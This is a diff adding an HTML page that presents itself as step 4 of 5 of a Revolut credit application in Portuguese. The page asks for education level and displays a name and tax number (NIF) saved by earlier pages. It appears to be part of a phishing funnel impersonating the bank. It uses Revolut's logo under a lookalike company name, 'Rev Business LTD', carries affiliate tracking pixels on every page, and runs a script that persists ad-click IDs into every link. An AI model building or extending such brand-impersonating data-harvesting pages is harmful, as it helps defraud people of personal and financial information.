@@ -1,0 +1,418 @@
+<!DOCTYPE html><html lang="pt-PT"><head>
+<script>
+(function(){
+  var UTM_KEYS=['src','sck','utm_source','utm_campaign','utm_medium','utm_content','utm_term','fbclid','ttclid','gclid','gbraid','wbraid','click_id','CampaignID']; window.TRACKING_KEYS=UTM_KEYS;
+  var p=new URLSearchParams(window.location.search);
+  UTM_KEYS.forEach(function(k){ if(p.get(k)) localStorage.setItem(k,p.get(k)); });
+  var changed=false;
+  UTM_KEYS.forEach(function(k){ var v=localStorage.getItem(k); if(v&&!p.has(k)){p.set(k,v);changed=true;} });
+  if(changed) history.replaceState(null,'','?'+p.toString());
+  document.addEventListener('click',function(e){
+    var a=e.target.closest('a');
+    if(a&&a.href){ try{ var u=new URL(a.href,window.location.href); UTM_KEYS.forEach(function(k){ var v=localStorage.getItem(k); if(v&&!u.searchParams.has(k)) u.searchParams.set(k,v); }); a.href=u.toString(); }catch(ex){} }
+  },true);
+})();
+</script>
+<script>
+function redirectWithParams(destination) {
+const currentParams = window.location.search;
+if (!currentParams) {
+window.location.href = destination;
+return;
+}
+
+if (destination.includes("?")) {
+window.location.href = destination + "&" + currentParams.substring(1);
+} else {
+window.location.href = destination + currentParams;
+}
+}
+</script>
+<meta charset="utf-8">
+<meta content="width=device-width,initial-scale=1" name="viewport">
+<title>Escolaridade — Revolut</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Sora:wght@600;700;800&display=swap');
+
+  :root {
+    --black: #0a0a0a;
+    --bg: #F4F5F7;
+    --card: #FFFFFF;
+    --text: #111827;
+    --text-mid: #374151;
+    --text-light: #6B7280;
+    --border: #E5E7EB;
+    --border-light: #F3F4F6;
+    --accent-soft: #EEEAFB;
+    --radius: 20px;
+    --shadow: 0 4px 24px rgba(0,0,0,.06), 0 1px 2px rgba(0,0,0,.04);
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'DM Sans', sans-serif;
+    -webkit-font-smoothing: antialiased;
+    min-height: 100vh;
+    padding-top: 72px;
+    display: flex; flex-direction: column;
+    line-height: 1.5;
+  }
+  header.header {
+    background:#fff; padding:14px 0;
+    position:fixed; top:0; width:100%; z-index:1000;
+    box-shadow: 0 1px 0 var(--border);
+  }
+  .header-content {
+    padding: 0 20px; display:flex; align-items:center; justify-content:space-between;
+    max-width:420px; margin:0 auto;
+  }
+  .header-left { display:flex; align-items:center; gap:14px; }
+  .menu-icon {
+    width:36px; height:36px; border-radius:50%;
+    background: var(--accent-soft);
+    display:flex; align-items:center; justify-content:center;
+  }
+  .menu-icon svg { width:18px; height:18px; color: var(--black); stroke-width:2.2; }
+  .header-right { display:flex; align-items:center; gap:10px; }
+  .user-info { text-align:right; line-height:1.1; }
+  .user-name { font-size:13px; font-weight:700; color: var(--text); }
+  .user-nif  { font-size:11px; color: var(--text-light); letter-spacing:.5px; }
+  .avatar {
+    width:34px; height:34px; border-radius:50%;
+    border:1px solid var(--border);
+    display:flex; align-items:center; justify-content:center;
+    color: var(--text-mid);
+  }
+  .avatar svg { width:18px; height:18px; }
+
+  .container { flex:1; padding: 18px 16px 28px; display:flex; justify-content:center; }
+  .card {
+    width: 100%; max-width: 420px;
+    background: var(--card); border-radius: var(--radius);
+    box-shadow: var(--shadow);
+    padding: 22px 20px 26px;
+  }
+
+  .progress-wrap { margin-bottom: 14px; }
+  .progress-bar {
+    height: 6px; background: #EEF0F4; border-radius: 999px; overflow: hidden;
+  }
+  .progress-bar > div {
+    width: 80%; height: 100%; background: var(--black); border-radius: 999px;
+    transition: width .4s ease;
+  }
+  .progress-text { text-align:center; font-size:13px; color: var(--text-light); margin-top: 10px; }
+
+  h1.title {
+    font-family: 'Sora', sans-serif;
+    font-size: 22px; font-weight: 700;
+    text-align:center; color: var(--text);
+    margin-top: 6px;
+  }
+  p.subtitle {
+    text-align:center; color: var(--text-light);
+    font-size: 14px; margin-top: 6px; margin-bottom: 18px;
+  }
+  .section-label {
+    font-size: 12px; font-weight: 700; color: var(--text-mid);
+    letter-spacing: .6px; text-transform: uppercase;
+    margin-bottom: 10px;
+  }
+
+  .list {
+    display:flex; flex-direction:column; gap: 10px;
+  }
+  .opt {
+    background: #fff;
+    border: 1.5px solid var(--border);
+    border-radius: 16px;
+    padding: 15px 16px;
+    display:flex; align-items:center; gap: 12px; cursor:pointer;
+    transition: all .15s ease;
+  }
+  .opt:hover { border-color: #C7C9D1; }
+  .opt.selected {
+    border-color: var(--black);
+    background: #FAFAFB;
+    box-shadow: 0 0 0 3px rgba(10,10,10,.06);
+  }
+  .opt svg { width: 22px; height: 22px; color: var(--text); stroke-width: 1.8; flex-shrink:0; }
+  .opt span { font-size: 15px; font-weight: 500; color: var(--text); }
+
+  .actions {
+    margin-top: 22px;
+    display:flex; gap: 10px;
+  }
+  .btn-voltar {
+    flex: 1;
+    height: 56px;
+    background: #fff; color: var(--text);
+    border: 1.5px solid var(--border); border-radius: 999px;
+    font-family: 'DM Sans', sans-serif; font-weight: 700; font-size: 15px;
+    cursor: pointer;
+    display:flex; align-items:center; justify-content:center; gap: 8px;
+  }
+  .btn-next {
+    flex: 2;
+    height: 56px;
+    background: var(--black); color: #fff;
+    border: none; border-radius: 999px;
+    font-family: 'DM Sans', sans-serif; font-weight: 700; font-size: 16px;
+    cursor: pointer; opacity: .45; pointer-events: none;
+    display:flex; align-items:center; justify-content:center; gap:10px;
+    transition: opacity .2s ease;
+  }
+  .btn-next.enabled { opacity: 1; pointer-events: auto; }
+  .btn-next.loading .spinner { display:block; }
+  .spinner {
+    display:none; width:18px; height:18px; border-radius:50%;
+    border: 2px solid rgba(255,255,255,.35); border-top-color:#fff;
+    animation: spin .8s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .trust {
+    margin-top: 14px;
+    display:flex; align-items:center; gap:10px;
+    padding: 12px 14px;
+    background: var(--border-light);
+    border-radius: 14px;
+    font-size: 12px; color: var(--text-mid);
+  }
+  .trust svg { width:16px; height:16px; flex-shrink:0; color: var(--text-mid); }
+
+  footer.site-footer {
+    margin-top: 18px; padding: 18px 20px 28px;
+    text-align:center; color: var(--text-light); font-size: 12px;
+  }
+  .footer-logo img { height: 31px; width:auto; display:block; margin: 0 auto 8px; }
+  .footer-company { font-weight: 600; color: var(--text-mid); }
+  .footer-meta { margin-top: 2px; }
+  .footer-badges {
+    margin-top: 10px; display:flex; justify-content:center; gap: 14px; flex-wrap:wrap;
+  }
+  .footer-badges span { display:inline-flex; align-items:center; gap:5px; color: var(--text-mid); }
+  .footer-badges svg { width: 14px; height: 14px; color: var(--text-mid); }
+</style>
+<script>
+  window.pixelId = "6a5594cf5757aed4584adce8";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.googlePixelId = "6a45c62144ce1832379750fa";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+  document.head.appendChild(a);
+</script>
+
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+  window.tikTokPixelId = "6a5593d07d9a2ac947099389";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.va = window.va || function () { (window.vaq = window.vaq || []).push(arguments); };
+</script>
+<script defer="" src="js/script.js"></script>
+
+<style id="legal-footer-style">
+  .legal-footer{width:100%;max-width:760px;margin:22px auto 0;padding:18px 16px 26px;text-align:center;color:#6b7280;font-size:11.5px;line-height:1.55}
+  .legal-footer__company{font-weight:700;color:#111827;margin-bottom:2px}
+  .legal-footer__links{display:flex;justify-content:center;gap:12px;flex-wrap:wrap;margin-top:8px}
+  .legal-footer__links a{color:#111827;text-decoration:underline;text-underline-offset:3px}
+</style>
+  <script src="js/tracking.js" data-project="revoopt-blue-one" defer=""></script>
+</head>
+<body>
+
+<header class="header">
+  <div class="header-content">
+    <div class="header-left">
+      <div class="menu-icon">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path d="M4 6h16M4 12h16M4 18h16" stroke-linecap="round" stroke-linejoin="round"></path>
+        </svg>
+      </div>
+      <img alt="Revolut" src="images/revolut-logo.svg" style="height:24px;width:auto;">
+    </div>
+    <div class="header-right">
+      <div class="user-info">
+        <div class="user-name" id="userName">Cliente</div>
+        <div class="user-nif" id="userNif">••• ••• •••</div>
+      </div>
+      <div class="avatar">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" stroke-linecap="round" stroke-linejoin="round"></path>
+        </svg>
+      </div>
+    </div>
+  </div>
+</header>
+
+<div class="container">
+  <div class="card">
+    <div class="progress-wrap">
+      <div class="progress-bar"><div></div></div>
+      <div class="progress-text">4 de 5</div>
+    </div>
+
+    <h1 class="title">Escolaridade</h1>
+    <p class="subtitle">Indique o seu nível de escolaridade</p>
+
+    <div class="section-label">Sua escolaridade</div>
+
+    <div class="list" id="list">
+      <div class="opt" data-value="Sem escolaridade">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9" stroke-linecap="round" stroke-linejoin="round"></circle><path d="M9 10h6M9 14h6" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+        <span>Sem escolaridade</span>
+      </div>
+      <div class="opt" data-value="Ensino Básico">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><rect x="4" y="6" width="16" height="13" rx="2" stroke-linejoin="round"></rect><path d="M8 6V4a1 1 0 011-1h6a1 1 0 011 1v2" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+        <span>Ensino Básico</span>
+      </div>
+      <div class="opt" data-value="Ensino Secundário">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><rect x="4" y="6" width="16" height="13" rx="2" stroke-linejoin="round"></rect><path d="M8 6V4a1 1 0 011-1h6a1 1 0 011 1v2" stroke-linecap="round" stroke-linejoin="round"></path><path d="M9 10h6M9 13h6M9 16h4" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+        <span>Ensino Secundário</span>
+      </div>
+      <div class="opt" data-value="Curso Técnico/Profissional">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M14.7 6.3a1 1 0 000-1.4l-2.3-2.3a1 1 0 00-1.4 0l-2.3 2.3a1 1 0 000 1.4l2.3 2.3a1 1 0 001.4 0l2.3-2.3z" stroke-linecap="round" stroke-linejoin="round"></path><path d="M6 14l2 2 4-4" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+        <span>Curso Técnico/Profissional</span>
+      </div>
+      <div class="opt" data-value="Licenciatura">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M12 3l9-4v8c0 4.5-3.8 8.4-9 9.5-5.2-1.1-9-5-9-9.5V3l9 4z" stroke-linecap="round" stroke-linejoin="round"></path><path d="M12 7l-5-2" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+        <span>Licenciatura</span>
+      </div>
+      <div class="opt" data-value="Pós-Graduação">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M12 3l9-4v8c0 4.5-3.8 8.4-9 9.5-5.2-1.1-9-5-9-9.5V3l9 4z" stroke-linecap="round" stroke-linejoin="round"></path><path d="M12 7l-5-2" stroke-linecap="round" stroke-linejoin="round"></path><path d="M12 12v3" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+        <span>Pós-Graduação</span>
+      </div>
+      <div class="opt" data-value="Mestrado">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M9 11l3 3L22 4" stroke-linecap="round" stroke-linejoin="round"></path><path d="M21 12v7a2 2 0 01-2 2H5a2 2 0 01-2-2V5a2 2 0 012-2h11" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+        <span>Mestrado</span>
+      </div>
+      <div class="opt" data-value="Doutoramento">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M9 11l3 3L22 4" stroke-linecap="round" stroke-linejoin="round"></path><path d="M21 12v7a2 2 0 01-2 2H5a2 2 0 01-2-2V5a2 2 0 012-2h11" stroke-linecap="round" stroke-linejoin="round"></path><path d="M12 16v3" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+        <span>Doutoramento</span>
+      </div>
+    </div>
+
+    <div class="actions">
+      <button class="btn-voltar" id="btnVoltar" type="button">
+        <svg fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24" width="18" height="18">
+          <path d="M15 18l-6-6 6-6" stroke-linecap="round" stroke-linejoin="round"></path>
+        </svg>
+        Voltar
+      </button>
+      <button class="btn-next" id="btnNext" type="button">
+        <span>Continuar</span>
+        <div class="spinner"></div>
+      </button>
+    </div>
+
+    <div class="trust">
+      <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+        <path d="M12 15v2m-6 4h12a2 2 0 002-2v-7a2 2 0 00-2-2H6a2 2 0 00-2 2v7a2 2 0 002 2zm10-11V7a4 4 0 00-8 0v4h8z" stroke-linecap="round" stroke-linejoin="round"></path>
+      </svg>
+      <span>As suas informações são utilizadas apenas para análise de crédito.</span>
+    </div>
+  </div>
+</div>
+
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-logo">
+      <img src="images/revolut-logo.svg" alt="Revolut" style="height:36px;width:auto;display:block;margin:0 auto;">
+    </div>
+    <div class="footer-company">Rev Business LTD</div>
+    <div class="footer-meta">Avenida da Liberdade, 110 - 1269-046 Lisboa</div>
+    <div class="footer-badges">
+      <span>
+        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <path d="M12 15v2m-6 4h12a2 2 0 002-2v-7a2 2 0 00-2-2H6a2 2 0 00-2 2v7a2 2 0 002 2zm10-11V7a4 4 0 00-8 0v4h8z" stroke-linecap="round" stroke-linejoin="round"></path>
+        </svg>
+        SSL Seguro
+      </span>
+      <span>
+        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <path d="M9 12l2 2 4-4m5.6-4A11.95 11.95 0 0112 3 11.95 11.95 0 013.4 6 12 12 0 003 9c0 5.6 3.8 10.3 9 11.6 5.2-1.3 9-6 9-11.6 0-1-.1-2-.4-3z" stroke-linecap="round" stroke-linejoin="round"></path>
+        </svg>
+        Dados protegidos
+      </span>
+    </div>
+  </div>
+</footer>
+
+<script>
+  (function () {
+    const nome = localStorage.getItem('nome') || '';
+    const nif  = localStorage.getItem('nif')  || '';
+    if (nome) {
+      const parts = nome.trim().split(/\s+/);
+      const first = parts[0] || '';
+      const last  = parts.slice(-1)[0] || '';
+      const label = (first + (last && last !== first ? ' ' + last : '')).toLowerCase()
+        .replace(/\b\w/g, c => c.toUpperCase());
+      document.getElementById('userName').textContent = label;
+    }
+    if (nif) {
+      const digits = nif.replace(/\D/g, '');
+      if (digits.length >= 9) {
+        document.getElementById('userNif').textContent =
+          digits.slice(0,3) + ' *** ' + digits.slice(6,9);
+      }
+    }
+  })();
+
+  const list = document.getElementById('list');
+  const btn  = document.getElementById('btnNext');
+  const btnVoltar = document.getElementById('btnVoltar');
+  let selected = null;
+
+  list.addEventListener('click', (e) => {
+    const opt = e.target.closest('.opt');
+    if (!opt) return;
+    list.querySelectorAll('.opt').forEach(o => o.classList.remove('selected'));
+    opt.classList.add('selected');
+    selected = opt.dataset.value;
+    btn.classList.add('enabled');
+  });
+
+  btnVoltar.addEventListener('click', () => {
+    redirectWithParams('5.html');
+  });
+
+  btn.addEventListener('click', () => {
+    if (!selected) return;
+    localStorage.setItem('escolaridade', selected);
+    btn.classList.add('loading');
+    const p = new URLSearchParams(window.location.search);
+    p.set('escolaridade', selected);
+    setTimeout(() => {
+      redirectWithParams('7.html');
+    }, 400);
+  });
+</script>
+
+<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'sxb1plzcpnl503952'},{'dcenter':'sxb1'},{'cp_id':'10972497'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src="js/scc-c2.min.js"></script>
+
+<div class="legal-footer">
+  <div class="legal-footer__company">Rev Business LTD</div>
+  <div>Avenida da Liberdade, 110, 1269-046 Lisboa, Portugal</div>
+  <div class="legal-footer__links">
+    <a href="termos-de-uso.html">Termos de Uso</a>
+    <a href="politica-de-privacidade.html">Política de Privacidade</a>
+  </div>
+</div>
+
+</body></html>
